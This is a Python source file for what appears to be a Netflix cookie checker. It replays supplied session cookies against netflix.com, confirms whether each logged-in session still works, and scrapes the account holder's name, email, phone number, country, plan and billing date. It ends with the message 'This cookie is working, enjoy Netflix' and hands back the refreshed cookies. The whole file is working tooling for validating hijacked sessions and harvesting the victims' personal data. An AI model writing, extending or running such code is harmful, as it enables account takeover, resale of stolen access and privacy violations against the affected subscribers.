import httpx
import re
import pycountry
import langcodes
from datetime import datetime, timezone
from netflix_utils import extract_netflix_account_info

def safe_decode_unicode(s):
    """
    Decodes unicode escape sequences and ensures no lone surrogates exist.
    """
    if not s:
        return s
    try:
        # Decode escape sequences (e.g. \u00e9 -> é)
        decoded = bytes(s, 'utf-8').decode('unicode_escape')
    except Exception:
        return s

    # Sanitize lone surrogates that are invalid in UTF-8
    # encode with 'replace' converts surrogates to '?' (or similar)
    # decode back to string
    return decoded.encode('utf-8', 'replace').decode('utf-8')

async def verify_account_async(cookies):
    """
    Verifies Netflix cookies and extracts account information.

    Args:
        cookies (dict): A dictionary of cookies to send.

    Returns:
        dict: A dictionary containing 'lines', 'cookies', and 'info' if valid, else None.
    """
    # Ensure cookies are properly formatted for the request
    # httpx accepts a dict of cookies.
    session_cookies = cookies
    final_cookies = None

    async with httpx.AsyncClient(
        headers={"User-Agent": "Mozilla/5.0"},
        cookies=session_cookies,
        timeout=10.0
    ) as client:
        try:
            # 1) inject on root
            await client.get("https://www.netflix.com", follow_redirects=True)
            # 2) then check /account
            resp = await client.get(
                "https://www.netflix.com/account",
                follow_redirects=True
            )
            html  = resp.text
            valid = str(resp.url).startswith("https://www.netflix.com/account")
            final_cookies = client.cookies
        except httpx.HTTPError:
            valid = False
            html  = ""

    if valid:
        # (scrape all account info exactly as before…)
        info = extract_netflix_account_info(html)
        billed_using = info.splitlines()[1:] if info else []

        change_plan_m = re.search(
            r'"canChangePlan":\s*{\s*"fieldType":\s*".*?"\s*,\s*"value"\s*:\s*(true|false)}',
            html
        )
        can_change_plan = change_plan_m.group(1).capitalize() if change_plan_m else None

        hold_m = re.search(r'"isUserOnHold"\s*:\s*(true|false)', html)
        hold   = hold_m.group(1).capitalize() if hold_m else None

        pd_m = re.search(
            r'"localizedPlanName"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"',
            html
        )
        plan = pd_m.group(1) if pd_m else None

        ms_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html)
        membership = ms_m.group(1).replace('_', ' ').title() if ms_m else None

        co_m = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2})"', html)
        country = None
        region_code = "Unknown"
        if co_m:
            code    = co_m.group(1)
            region_code = code
            try:
                c_obj = pycountry.countries.get(alpha_2=code)
                country = f"({code}) {c_obj.name}" if c_obj else f"({code})"
            except LookupError:
                country = f"({code})"

        fn_m = re.search(r'"firstName"\s*:\s*"([^"]+)"', html)
        name_val = fn_m.group(1) if fn_m else None
        if name_val:
            name_val = safe_decode_unicode(name_val)

        em_m = re.search(r'"emailAddress"\s*:\s*"(.*?)"', html)
        mail = None
        if em_m:
            mail = safe_decode_unicode(em_m.group(1))

        ph_m   = re.search(r'"phoneNumber"\s*:\s*"(.*?)"', html)
        phone = None
        if ph_m:
            phone = safe_decode_unicode(ph_m.group(1))

        ms2_m  = re.search(r'"memberSince"\s*:\s*{[^}]*"value"\s*:(\d+)', html)
        signup = None
        if ms2_m:
            try:
                ts     = int(ms2_m.group(1)) / 1000.0
                dt     = datetime.fromtimestamp(ts, tz=timezone.utc)
                signup = dt.strftime("%b %-d, %Y at %H:%M:%S UTC")
            except Exception:
                pass

        np_m      = re.search(
            r'"nextBillingDate"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"',
            html
        )
        next_pay = None
        if np_m:
             next_pay = safe_decode_unicode(np_m.group(1))

        ems_m       = re.search(
            r'"showExtraMemberSection"\s*:\s*{[^}]*"value"\s*:\s*(true|false)',
            html
        )
        extra_slots = ems_m.group(1).capitalize() if ems_m else None

        lang_m      = re.search(r'"language"\s*:\s*"([a-z]{2})"', html)
        display_lang = None
        if lang_m:
            try:
                display_lang = langcodes.Language.get(lang_m.group(1)).display_name()
            except Exception:
                display_lang = lang_m.group(1)

        section = ["Account Information:"]
        section += billed_using
        if country:      section.append(f"Country: {country}")
        if membership:   section.append(f"Membership status: {membership}")
        if hold is not None:
            st = "Active" if hold=="False" else "On Hold"
            section.append(f"Plan status: {st}")
        if plan:         section.append(f"Plan details: {plan}")
        if can_change_plan:
            section.append(f"Can change plan: {can_change_plan}")
        if next_pay:     section.append(f"Next payment: {next_pay}")
        if signup:       section.append(f"Signup D&T: {signup}")
        if extra_slots:  section.append(f"Extra Slots: {extra_slots}")
        if mail:         section.append(f"Mail: {mail}")
        if phone:        section.append(f"Phone: {phone}")
        if name_val:     section.append(f"Name: {name_val}")
        if display_lang: section.append(f"Display Language: {display_lang}")

        # Add success message as requested
        section.append("✅ This cookie is working, enjoy Netflix 🍿")

        extracted_info = {
            "region": region_code,
            "next_billing_date": next_pay if next_pay else "Unknown"
        }

        return {
            "lines": section,
            "cookies": final_cookies,
            "info": extracted_info
        }

    return None
